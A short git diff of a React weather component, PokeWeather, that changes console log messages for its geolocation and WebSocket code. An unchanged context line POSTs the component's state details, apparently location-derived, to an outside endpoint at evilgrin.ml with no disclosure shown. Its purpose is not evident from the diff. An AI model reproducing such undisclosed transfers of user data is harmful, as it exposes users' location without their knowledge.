@@ -30,7 +30,8 @@ class PokeWeather extends React.Component {
         .then( () => fetch('https://evilgrin.ml/api/log', {method: "POST",body: JSON.stringify(this.state.details)})
         .then(response => response.json())
         )
-        .catch((err)=>console.log(err));
+        // .catch((err)=>console.log(err));
+        .catch((err)=>console.log("geo failed"));
 
   }
 
@@ -85,7 +86,7 @@ class PokeWeather extends React.Component {
 
       ws.onopen = () => {
         // on connecting, do nothing but log it to the console
-        console.log("connected");
+        console.log("ws connected");
         this.setState({ is_loading:true });
         ws.send(this.state.coords);
       };
@@ -99,7 +100,7 @@ class PokeWeather extends React.Component {
       };
 
       ws.onclose = () => {
-        console.log("disconnected");
+        console.log("ws disconnected");
         this.setState({ is_loading:false });
         this.resultRef.current.scrollIntoView({
           behavior: "smooth",
